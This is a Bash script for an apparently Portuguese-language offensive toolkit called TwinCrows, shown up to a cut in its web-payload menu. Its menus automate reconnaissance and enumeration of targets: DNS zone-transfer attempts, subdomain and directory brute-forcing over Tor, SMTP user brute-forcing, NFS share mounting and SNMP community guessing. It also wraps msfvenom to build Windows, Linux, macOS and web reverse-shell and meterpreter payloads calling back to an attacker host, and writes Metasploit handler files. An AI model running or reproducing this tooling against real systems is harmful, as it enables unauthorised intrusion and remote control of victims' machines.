#!/bin/bash

tc_banner() {
	clear

	echo -ne "${cinza}\n\n"

	local banner=()

	banner+=("▀▀█▀▀ █░░░█ ░▀░ █▀▀▄ ▒█▀▀█ █▀▀█ █▀▀█ █░░░█ █▀▀\n")
	banner+=("░▒█░░ █▄█▄█ ▀█▀ █░░█ ▒█░░░ █▄▄▀ █░░█ █▄█▄█ ▀▀█\n")
	banner+=("░▒█░░ ░▀░▀░ ▀▀▀ ▀░░▀ ▒█▄▄█ ▀░▀▀ ▀▀▀▀ ░▀░▀░ ▀▀▀\n")

	for linha in "${banner[@]}"
	do
		centralizado $linha
		sleep 0.05
	done

	echo -ne "${normal}\n"

}

sair() {
	echo -e "${cinza}\n\nOBRIGADO POR UTILIZAR O TWINCROWS!\n\n${normal}"
	exit
}

tc_html_parsing() {
	centralizado "${azulbold}===== HTML parsing =====\n\n${normal}"
	echo -e "${cinza}Este modulo faz um parsing no codigo html da pagina informada e extrai todos os links encontrados e seus respectivos IPs de servidor.${normal}"
	echo
	printf "${verde}Informe o dominio: ${normalbold}"
	read dominio
	echo
        centralizado "${azulbold}=====RESULTADO======${normal}\n"
	echo
	wget -q $dominio
	cat index.html | grep '<a .*href=.*>' | sed -e 's/<a /\n<a /g' | sed -e 's/<a .*href=['"'"'"]//' -e 's/["'"'"'].*$//' -e '/^$/ d' | grep :// | cut -d "/" -f 3 | cut -d ":" -f 1 | grep "\." | grep -v "%" | sort | uniq > dominios.txt
	touch $dominio.prov.txt
	host $dominio | grep "has address" | cut -d " " -f 1,4 >> $dominio.txt
	for url in $(cat dominios.txt)
	do
	host $url | grep "has address" | cut -d " " -f 1,4 >> $dominio.prov.txt
	done
	rm -f index*
	rm -f dominios.txt
	cat $dominio.prov.txt | uniq >> $dominio.txt
	rm -f $dominio.prov.txt
	cat $dominio.txt
	rm -f $dominio.txt
	echo -e "\n"
	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
        read opcao
        if [ "$opcao" == "s" ]
        then
                tc_html_parsing
        else
                exec $1
        fi

}

tc_whois() {
	centralizado "${azulbold}===== whois =====\n\n${normal}"
        echo -e "${cinza}Este modulo executa uma pesquisa de whois no dominio informado, as informacoes entregues podem ser usadas para obter mais informacoes."
        echo
        printf "${verde}Digite o dominio ou IP: ${normalbold}"
        read dominio
        echo
        centralizado "${azulbold}=====RESULTADO======${normal}\n"
        echo
        whois $dominio
	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
	read opcao
	if [ "$opcao" == "s" ]
	then
		tc_whois
	else
		exec $1
	fi
}

tc_map_dom() {
	centralizado "${azulbold}===== Mapeamento de dominio =====\n\n${normal}"
	echo -e "${cinza}Este modulo traz informacoes valiosas sobre as configuracoes do servidor, como enderecos de IP, servidores de DNS, servidores de e-mail, configuracoes, alem de fazer uma tentativa de transferencia de zona, estas informacoes podem ser usadas em ataques posteriores."
	echo
	printf "${verde}Informe o dominio: ${normalbold}"
	read dominio
	echo -e "\n"
	centralizado "${azulbold}===== RESULTADO =====${normal}\n"
	echo -e "\n\n${amarelo}---- Endereco IPv4 ------------------------------------${normal}\n"
	host -t A $dominio
	echo -e "\n\n${amarelo}---- Endereco IPv6 ------------------------------------${normal}\n"
	host -t aaaa $dominio
	echo -e "\n\n${amarelo}---- Servidor de DNS ----------------------------------${normal}\n"
	host -t ns $dominio
	echo -e "\n\n${amarelo}---- Servidor de e-mail -------------------------------${normal}\n"
	host -t mx $dominio
	echo -e "\n\n${amarelo}---- TXT info -----------------------------------------${normal}\n"
	host -t txt $dominio
	echo -e "\n\n${amarelo}---- HINFO --------------------------------------------${normal}\n"
	host -t hinfo $dominio
	echo -e "\n\n${amarelo}---- Tentativa de transferencia de zona  --------------${normal}\n"
	for dns in $(host -t ns $dominio | cut -d " " -f4)
	do
		host -l $dominio $dns
	done
	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]: ${normalbold}"
        read opcao
        if [ "$opcao" == "s" ]
        then
                tc_map_dom
        else
                exec $1
        fi
}

tc_bf_subd() {
	wlsubdominio=$2
	centralizado "${azulbold}===== Bruteforce de subdominio =====\n\n${normal}"
	echo -e "${cinza}Este modulo faz um bruteforce para encontrar subdominios listados, o TwinCrows vem com uma wordlist padrao, porem uma outra pode ser fornecida."
	echo
	printf "${verde}Informe o dominio: ${normalbold}"
	read dominio
	echo -e "\n"
	printf "${verde}Deseja informar uma wordlist? [s/n]: ${normalbold}"
	read opcao
	if [ "$opcao" == "s" ]
	then
		printf "${verde}Informe o caminho da wordlist: ${normalbold}"
		read wlsubdominio
	fi
	echo -e "\n"
	centralizado "${azulbold}Mapeando os subdominios, aguarde...${normal}\n"
	echo
	for sub in $(cat $wlsubdominio)
	do
		if [ $(host $sub.$dominio | grep "has address" | wc -l) -gt 0 ]
		then
			echo -ne "\r$sub.$dominio ENCONTRADO"
			echo
		else
			echo -ne "\r$sub.$dominio ...              "
		fi
	done
	sair
}

tc_dns_rev() {
	centralizado "${azulbold}===== DNS Reverso =====\n\n${normal}"
	echo -e "${cinza}Este modulo faz uma pesquisa reversa, a partir de um range de IP coletado em modulos anteriores, e possivel fazer uma pesquisa e revelar qual deles tem um dominio associado."
	echo
	printf "${verde}Informe o IP da rede Ex 37.59.174.226: ${normalbold}"
	read ip
	echo $ip > ip
	echo
        printf "${verde}Digite o intervalo do netrange Ex: 220 226: ${normalbold}"
	read intervalo
	echo
	centralizado "${azulbold}===== RESULTADO =====${normal}\n"
        echo -e "\n"
	prefixo=$(awk -F. '{print $1"."$2"."$3}' ip)
	prefixo2=$(awk -F. '{print $1"-"$2"-"$3}' ip)
	for range in $(seq $intervalo)
	do
		ht=$(host -t ptr $prefixo.$range | grep -v "$prefixo2" | grep -v "NXDOMAIN" | cut -d " " -f 5) 
		if [ ! -z "$ht" ]
		then
			echo -e "$ht -- $prefixo.$range"
		fi
	done
	rm -f ip
	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]: ${normalbold}"
        read opcao
        if [ "$opcao" == "s" ]
        then
                tc_dns_rev
        else
                exec $1
        fi
}

tc_dirsearch() {
	wldiretorio=$2
	centralizado "${azulbold}===== Dirsearch =====\n\n${normal}"
	echo -e "${cinza}Este modulo faz um bruteforce de diretorios na pagina web, utiliza de uma wordlist que o TwinCrows fornece, ou permite utilizacao de outra. Alem de diretorios, este modulo tambem faz pesquisa por extensoes de paginas, como php, asp, html... Afim de encontrar paginas acessiveis. Este modulo tambem permite o uso da rede Tor para anonimizacao das pesquisas."
	echo
	printf "${verde}Informe o dominio: ${normalbold}"
        read dominio
        echo
	printf "${verde}Informe uma extensao ex(php) ou pressione enter para não pesquisar por arquivos: ${normalbold}"
	read extensao
	echo
	printf "${verde}Deseja informar uma wordlist? [s/n]: ${normalbold}"
        read opcao
        if [ "$opcao" == "s" ]
        then
                printf "${verde}Informe o caminho da wordlist: ${normalbold}"
                read wldiretorio
        fi
	echo
	printf "${verde}Deseja utilizar o Tor como proxy? [s/n]: ${normalbold}"
	read optprox
	if [ "$optprox" == "s" ]
	then
		service tor restart
		webrecon $wldiretorio $dominio $extensao "proxychains"
	else
		webrecon $wldiretorio $dominio $extensao
	fi
	sair

}

tc_whatweb() {
	centralizado "${azulbold}===== Whatweb =====\n\n${normal}"
	echo -e "${cinza}Este modulo executa o whatweb e enumera informacoes detalhadas sobre o servidor, paginas e tecnologias utilizadas na pagina."
	echo
	printf "${verde}Informe o dominio: ${normalbold}"
	read dominio
	echo
	centralizado "${azulbold}===== RESULTADO =====${normal}\n"
	echo
	whatweb -v $dominio -U "TwinCrows"
	rm -f ip
        printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]: ${normalbold}"
        read opcao
        if [ "$opcao" == "s" ]
        then
                tc_whatweb
        else
                exec $1
        fi
}

tc_pagesearch() {
	centralizado "${azulbold}===== Pagesearch =====\n\n${normal}"
	echo -e "${cinza}Este modulo utiliza uma google dork para enumerar paginas de um website de acordo com a extensao pesquisada, ex php,asp, html."
	echo
	printf "${verde}Informe o dominio: ${normalbold}"
        read dominio
        echo
	printf "${verde}Informe a extensão da pagina ex(php): ${normalbold}"
	read extensao
	echo
        centralizado "${azulbold}===== RESULTADO =====${normal}\n"
        echo
	saida=$(lynx -dump "http://google.com/search?num=500&q=site:"$dominio"+ext:"$extensao"" | cut -d "=" -f2 | grep ".$extensao" | egrep -v "site|google" | sed s'/...$//'g)
	if [ -z "$saida" ]
	then
		echo -e "Não houve resultados para esta pesquisa\n"
	else
		lynx -dump "http://google.com/search?num=500&q=site:"$dominio"+ext:"$extensao"" | cut -d "=" -f2 | grep ".$extensao" | egrep -v "site|google" | sed s'/...$//'g
		echo -e "\n"
	fi
	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]: ${normalbold}"
        read opcao
        if [ "$opcao" == "s" ]
        then
                tc_pagesearch
        else
                exec $1
        fi

}

tc_pingsweep() {
	centralizado "${azulbold}===== PingSweep =====\n\n${normal}"
	echo -e "${cinza}Este modulo realiza um ping sweep em um intervalo de IPs e retorna quais estao ativos na rede."
	echo
	printf "${verde}Informe o IP da rede Ex 37.59.174.226: ${normalbold}"
        read ip
        echo $ip > ip
        echo
        printf "${verde}Digite o intervalo do netrange Ex: 220 226: ${normalbold}"
        read intervalo
        echo
        centralizado "${azulbold}===== RESULTADO =====${normal}\n"
        echo
        prefixo=$(awk -F. '{print $1"."$2"."$3}' ip)
        prefixo2=$(awk -F. '{print $1"-"$2"-"$3}' ip)
        for range in $(seq $intervalo);do ping -c 1 $prefixo.$range -w 1| grep "64 bytes" | cut -d " " -f4 | sed s'/.$//'g
	done
	rm -f ip
	printf "${verdebold}\n\nDeseja efetuar um novo pingsweep? [s/n]: ${normalbold}"
        read opcao
        if [ "$opcao" == "s" ]
        then
                tc_pingsweep
        else
                exec $1
        fi
}

tc_mt_wl() {
	centralizado "${azulbold}===== Mutacao de Wordlist =====\n\n${normal}"
	echo -e "${cinza}Este modulo faz uma mutacao de palavras chave para explorar suas variacoes, quanto maior a lista de palavras chave, maior sera o resultado final."
	echo
	printf "${verde}Informe o caminho da wordlist base: ${normalbold}"
	read wl
	echo -e "\n"
	printf "${verde}Informe o nome para o arquivo de saida da wordlist mutada: ${normalbold}"
	read nome
	echo -e "\n\n"
	python3 $TCScripts/wlmutacao.py $wl $TCWordlists/$nome
	echo -e "\n"
	echo -e "Arquivo salvo em $TCWordlists/$nome"
	echo
	printf "${verdebold}\n\nDeseja efetuar uma nova mutacao de wordlist? [s/n]: ${normalbold}"
        read opcao
        if [ "$opcao" == "s" ]
        then
                tc_mt_wl
        else
                exec $1
        fi


}

tc_metadados() {
	centralizado "${azulbold}===== Analise de metadados =====\n\n${normal}"
	echo -e "${cinza}Este modulo faz uma pesquisa utilizando dorks para encontrar arquivos disponiveis em uma pagina, ao encontralos, faz o download no diretorio informado e em seguida faz a analise de seus metadados."
	echo
	printf "${verde}Informe o dominio para a pesquisa: ${normalbold}"
	read dominio
	echo -e '\n'
	printf "${verde}Informe a extensao para pesquisa de arquivo ex pdf, txt ou xlsx: ${normalbold}"
	read arquivo
	echo -e '\n'
	printf "${verde}Informe o caminho para salvar os arquivos baixados: ${normalbold}"
	read caminho
	echo -e '\n'
	lynx --dump "https://google.com/search?&q=site:"$dominio"+ext:"$arquivo"" | grep ".$arquivo" | cut -d "=" -f2 | egrep -v "google|site" | sed 's/...$//' > arquivos
	if [ $(cat arquivos | wc -l) == 0 ]
	then
		echo -e "\nNenhum arquivo encontrado\n"
	else
		for url in $(cat arquivos)
		do
			wget -q -P $caminho $url
		done
		exiftool $caminho/*.$arquivo
	fi
	rm -f arquivos
	echo
        printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
        read opcao
        if [ "$opcao" == "s" ]
        then
                tc_metadados
        else
                exec $1
        fi

}

tc_enumeration() {
	tc_banner

	centralizado "${azulbold}===== ENUMERATION =====\n\n${normal}"
	echo -e "${cinza}Este modulo permite a enumeracao de diversos servicos hospedados em servidores.${normal}"


	while :
	do

        echo
	echo -e "${verde}"
        echo -e "1 - FTP Enumeration"
	echo -e "2 - NetBIOS/SMB Enumeration"
	echo -e "3 - SMTP Enumeration e bruteforce"
	echo -e "4 - NSE Enumeration"
	echo -e "5 - SNMP Enumeration"
        echo
        echo -e "0 - voltar${normal}"

        echo -e "${normalbold}"
	printf $nvl2
        read -p ' ' opcao

        echo

        case $opcao in

		1)
			centralizado "${azulbold}===== Enumeracao de FTP =====\n\n${normal}"
			echo -e "${cinza}Este modulo faz uma conexao com o servidor ftp alvo e captura seu banner, logo em seguida faz a tentativa de login com um usuario informado e executa um comando."
			echo
			printf "${verde}Informe o IP do servidor ftp alvo: ${normalbold}"
			read ip
			printf "${verde}Informe a porta, caso seja diferente de 21: ${normalbold}"
			read ftpport
			if [ "$ftpport" == "" ]
			then
				ftpport=21
			fi
			printf "${verde}Informe um usuario para tentativa de login (default: anonymous): ${normalbold}"
			read ftpuser
			if [ "$ftpuser" == "" ]
			then
				ftpuser="anonymous"
			fi
			printf "${verde}Informe uma senha para tentativa de login (default: anonymous): ${normalbold}"
			read ftppass
			if [ "$ftppass" == "" ]
			then
				ftppass="anonymous"
			fi
			printf "${verde}Informe um comando para rodar apos o login (default: pwd): ${normalbold}"
			read ftpcmd
			if [ "$ftpcmd" == "" ]
			then
				ftpcmd="pwd"
			fi
			echo -e '\n'
			python $TCScripts/enumftp.py $ip $ftpport $ftpuser $ftppass $ftpcmd
			printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
        		read opcao
        		if [ "$opcao" == "s" ]
        		then
                		tc_enumeration
        		else
                		exec $TCPath/TwinCrows
        		fi
		;;

		2)
			centralizado "${azulbold}===== Enumeracao de NetBIOS/SMB =====\n\n${normal}"
			echo -e "${cinza}Este modulo utiliza o enum4linux para fazer uma varredura nos servicos de NetBIOS/SMB e tras informacoes importantes caso seja possivel."
			echo
			printf "${verde}Informe o IP do servidor alvo: ${normalbold}"
			read ip
			centralizado "${azulbold}===== RESULTADO =====${normal}\n"
        		echo
			enum4linux -a $ip
			printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
                        read opcao
                        if [ "$opcao" == "s" ]
                        then
                                tc_enumeration
                        else
                                exec $TCPath/TwinCrows
                        fi
		;;

		3)
			centralizado "${azulbold}===== Enumeracao e bruteforce de SMTP =====\n\n${normal}"
			echo -e "${cinza}Este modulo faz a enumeracao do servico de SMTP na porta 25 e faz bruteforce para encontrar usuarios validos utilizando o comando VRFY, nem todos os servicos tem esta vulnerabilidade. o TwinCrows tem uma wordlist padrao, mas uma nova pode ser informada."
			echo
			printf "${verde}Informe o IP do servidor alvo: ${normalbold}"
			read ip
			printf "${verde}Informe a porta caso seja diferente de 25, ou pressione enter: ${normalbold}"
			read porta
			if [ "$porta" == "" ]
			then
				porta=25
			fi
			printf "${verde}Informe o caminho de uma wordlist ou pressione enter para usar a padrao: ${normalbold}"
			read wl
			if [ "$wl" == "" ]
			then
				wl=$TCWordlists/usernames.txt
			fi
			centralizado "${azulbold}===== RESULTADO =====${normal}\n"
        		echo
			python $TCScripts/enumsmtp.py $ip $porta $wl
			printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
                        read opcao
                        if [ "$opcao" == "s" ]
                        then
                                tc_enumeration
                        else
                                exec $TCPath/TwinCrows
                        fi
		;;
		4)
			umount /tmp/tcnfs 2> /dev/null
			rm -rf /tmp/tcnfs 2> /dev/null
			centralizado "${azulbold}===== Enumeracao de NSE =====\n\n${normal}"
			echo -e "${cinza}Este modulo faz a enumeracao do servico de NSE, e se vulneravel, faz a montagem do diretorio compartilhado com seus respectivos acessos."
			echo
			printf "${verde}Informe o IP do servidor alvo: ${normalbold}"
			read ip
			printf "${verde}Informe a porta caso seja diferente de 2049, ou pressione enter: ${normalbold}"
			read porta
			if [ "$porta" == "" ]
			then
				porta=2049
			fi
			echo -e "\n${azul}Versoes suportadas:${normal}"
			rpcinfo -p $ip | grep nfs
			vernfs=$(rpcinfo -p $ip | grep nfs | grep tcp | cut -c15-15 | head -1)
			echo -e "\n${azul}Diretorios compartilhados:${normal}"
			showmount -e $ip
			dirnfs=$(showmount -e $ip | grep -v Export | cut -d "*" -f1)
			echo -e "\n${azul}Montando diretorio em /tmp/tcnfs...${normal}"
			sleep 0.05
			mkdir -p /tmp/tcnfs
			mount -t nfs -o nfsvers=$vernfs $ip:$dirnfs /tmp/tcnfs
			echo -e "\n${azulbold}Diretorio montado em /tmp/tcnfs Rodando comando ls -la${normal}"
			ls -la /tmp/tcnfs
			printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
                        read opcao
                        if [ "$opcao" == "s" ]
                        then
                                tc_enumeration
                        else
                                exec $TCPath/TwinCrows
                        fi

		;;
		5)
			centralizado "${azulbold}===== Enumeracao de SNMP =====\n\n${normal}"
			echo -e "${cinza}Este modulo faz a enumeracao do servico de SNMP, e se vulneravel, faz a montagem do diretorio compartilhado com seus respectivos acessos."
			echo
			printf "${verde}Informe o IP do host alvo: ${normalbold}"
			read ip
			printf "${verde}Informe o caminho para uma wordlist de communities ou pressione enter para usar a padrao: ${normalbold}"
			read wl
			echo -e "${azul}Procurando por communities...${normal}\n"
			if [ "$wl" == "" ]
			then
				wl=$TCWordlists/snmp.txt
			fi
			onesixtyone -c $wl $ip | cut -d " " -f1,2 | grep -v "Scanning"
			while [ "$com" == "" ]
			do
				printf "\n${verde}Qual community deseja utilizar? ${normalbold}"
				read com
			done
			xterm -title "SNMPWALK" -hold -geometry 96x120+0+0 -e snmpwalk -c $com -v1 $ip &
			echo -e "\n${azul}Executando checagem de SNMP, pode demorar um pouco...${normal}\n"
			snmp-check $ip -c $com
			printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
                        read opcao
                        if [ "$opcao" == "s" ]
                        then
                                tc_enumeration
                        else
                                exec $TCPath/TwinCrows
                        fi

		;;
		0)
			exec $TCPath/TwinCrows
		;;
		*)
	                echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
       		 ;;



	esac
	done

}

tc_payload() {
	tc_banner

	centralizado "${azulbold}===== MSFVENOM PAYLOADS =====\n\n${normal}"
	echo -e "${cinza}Este modulo utiliza o msfvenom para criar payloads executaveis. Tambem cria um rc para automatizar o uso dos exploits no metasploit.${normal}"

	while :
	do

        echo
	echo -e "${verde}"
        echo -e "1 - Windows"
	echo -e "2 - Linux"
	echo -e "3 - Mac"
	echo -e "4 - Web"
        echo
        echo -e "0 - voltar${normal}"

        echo -e "${normalbold}"
	printf $nvl2
        read -p ' ' opcao

        echo

        case $opcao in

		1)
			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}Windows${vermbold}]\n└─────►${normal}"
			centralizado "${azulbold}===== Windows Payloads =====\n\n${normal}"
			echo -e "${cinza}Escolha uma das opcoes."

			while :
			do

			echo -e "${verde}"
			echo -e "1 - windows/x64/meterpreter/reverse_tcp"
			echo -e "2 - windows/meterpreter/reverse_tcp"
			echo
			echo -e "0 - Voltar"

			echo -e "${normal}"
			printf $nvl3
			read -p ' ' opcao3

			echo

			case $opcao3 in
				"1")
					echo -e "${verde}"
					printf "Informe o LHOST: ${normalbold}"
					read lhost
					printf "${verde}Informe o LPORT: ${normalbold}"
					read lport
					printf "${verde}Informe o nome para o payload com extensao ex: programa.exe: ${normalbold}"
					read nome
					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
					read rc
					if [ "$rc" == "s" ]
					then
						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/win_x64_payload.rc${normal}"
						echo -e "use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/win_x64_payload.rc
					fi
					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
					msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $TCPayloads/$nome
					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                		        read opcao
                        		if [ "$opcao" == "s" ]
                        		then
                                		tc_payload
                        		else
                                		exec $TCPath/TwinCrows
                        		fi
				;;
				"2")
					echo -e "${verde}"
					printf "Informe o LHOST: ${normalbold}"
					read lhost
					printf "${verde}Informe o LPORT: ${normalbold}"
					read lport
					printf "${verde}Informe o nome para o payload com extensao ex: programa.exe: ${normalbold}"
					read nome
					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
					read rc
					if [ "$rc" == "s" ]
					then
						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/win_payload.rc${normal}"
						echo -e "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/win_payload.rc
					fi
					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
					msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $TCPayloads/$nome
					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                		        read opcao
                        		if [ "$opcao" == "s" ]
                        		then
                                		tc_payload
                        		else
                                		exec $TCPath/TwinCrows
                        		fi
				;;
				"0")
					tc_payload
				;;
				*)
		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
                		 ;;


			esac

			done
		;;


		2)
			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}Linux${vermbold}]\n└─────►${normal}"
			centralizado "${azulbold}===== Linux Payloads =====\n\n${normal}"
			echo -e "${cinza}Escolha uma das opcoes."

			while :
			do

			echo -e "${verde}"
			echo -e "1 - linux/x86/meterpreter_reverse_tcp"
			echo -e "2 - linux/x64/meterpreter/reverse_tcp"
			echo
			echo -e "0 - Voltar"

			echo -e "${normal}"
			printf $nvl3
			read -p ' ' opcao3

			echo
			case $opcao3 in
				"1")
					echo -e "${verde}"
					printf "Informe o LHOST: ${normalbold}"
					read lhost
					printf "${verde}Informe o LPORT: ${normalbold}"
					read lport
					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.elf: ${normalbold}"
					read nome
					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
					read rc
					if [ "$rc" == "s" ]
					then
						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/linux_x86_payload.rc${normal}"
						echo -e "use exploit/multi/handler\nset payload linux/x86/meterpreter_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/linux_x86_payload.rc
					fi
					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
					msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o $TCPayloads/$nome
					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                		        read opcao
                        		if [ "$opcao" == "s" ]
                        		then
                                		tc_payload
                        		else
                                		exec $TCPath/TwinCrows
                        		fi
				;;
				"2")
					echo -e "${verde}"
					printf "Informe o LHOST: ${normalbold}"
					read lhost
					printf "${verde}Informe o LPORT: ${normalbold}"
					read lport
					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.elf: ${normalbold}"
					read nome
					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
					read rc
					if [ "$rc" == "s" ]
					then
						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/linux_x64_payload.rc${normal}"
						echo -e "use exploit/multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/linux_x64_payload.rc
					fi
					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
					msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf -o $TCPayloads/$nome
					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                		        read opcao
                        		if [ "$opcao" == "s" ]
                        		then
                                		tc_payload
                        		else
                                		exec $TCPath/TwinCrows
                        		fi
				;;

				"0")
					tc_payload
				;;
				*)
		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
                		 ;;

			esac
			done

		;;
		3)
			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}MAC${vermbold}]\n└─────►${normal}"
			centralizado "${azulbold}===== MAC Payloads =====\n\n${normal}"
			echo -e "${cinza}Escolha uma das opcoes."

			while :
			do

			echo -e "${verde}"
			echo -e "1 - osx/x64/shell_reverse_tcp"
			echo -e "2 - osx/x86/shell_reverse_tcp"
			echo
			echo -e "0 - Voltar"

			echo -e "${normal}"
			printf $nvl3
			read -p ' ' opcao3

			echo

			case $opcao3 in
				"1")
					echo -e "${verde}"
					printf "Informe o LHOST: ${normalbold}"
					read lhost
					printf "${verde}Informe o LPORT: ${normalbold}"
					read lport
					printf "${verde}Informe o nome para o payload com extensao ex: programa.macho: ${normalbold}"
					read nome
					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
					read rc
					if [ "$rc" == "s" ]
					then
						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/mac_x64_payload.rc${normal}"
						echo -e "use exploit/multi/handler\nset payload osx/x64/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/mac_x86_payload.rc
					fi
					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
					msfvenom -p osx/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > $TCPayloads/$nome
					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                		        read opcao
                        		if [ "$opcao" == "s" ]
                        		then
                                		tc_payload
                        		else
                                		exec $TCPath/TwinCrows
                        		fi
				;;
				"2")
					echo -e "${verde}"
					printf "Informe o LHOST: ${normalbold}"
					read lhost
					printf "${verde}Informe o LPORT: ${normalbold}"
					read lport
					printf "${verde}Informe o nome para o payload com extensao ex: programa.macho: ${normalbold}"
					read nome
					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
					read rc
					if [ "$rc" == "s" ]
					then
						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/mac_x64_payload.rc${normal}"
						echo -e "use exploit/multi/handler\nset payload osx/x86/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/mac_x64_payload.rc
					fi
					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
					msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho -o $TCPayloads/$nome
					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
                		        read opcao
                        		if [ "$opcao" == "s" ]
                        		then
                                		tc_payload
                        		else
                                		exec $TCPath/TwinCrows
                        		fi
				;;
				"0")
					tc_payload
				;;
				*)
		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
                		 ;;

			esac
			done

		;;
		4)
			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}WEB${vermbold}]\n└─────►${normal}"
			centralizado "${azulbold}===== WEB Payloads =====\n\n${normal}"
			echo -e "${cinza}Escolha uma das opcoes."

			while :
			do

			echo -e "${verde}"
			echo -e "1 - PHP - php/meterpreter/reverse_tcp"
			echo -e "2 - JSP - java/jsp_shell_reverse_tcp"
			echo -e "3 - JS - nodejs/shell_reverse_tcp"
			echo -e "4 - FIREFOX - firefox/shell_reverse_tcp"
			echo -e "5 - ASP - windows/meterpreter/reverse_tcp"
			echo
			echo -e "0 - Voltar"

			echo -e "${normal}"
			printf $nvl3
			read -p ' ' opcao3

			echo

			case $opcao3 in
				"1")
					echo -e "${cinza}Este payload faz com que voce tenha conexao com o webserver que esta rodando o PHP e nao com o usuario que esta acessando.\n"
					echo -e "${verde}"
					printf "Informe o LHOST: ${normalbold}"
					read lhost
					printf "${verde}Informe o LPORT: ${normalbold}"
					read lport
					printf "${verde}Informe o nome para o payload com extensao ex: pagina.php: ${normalbold}"
					read nome
					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
					read rc
					if [ "$rc" == "s" ]
					then
						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/php_payload.rc${normal}"
						echo -e "use exploit/multi/handler\nset payload php/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/php_payload.rc
					fi
					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
					msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $TCPayloads/$nome
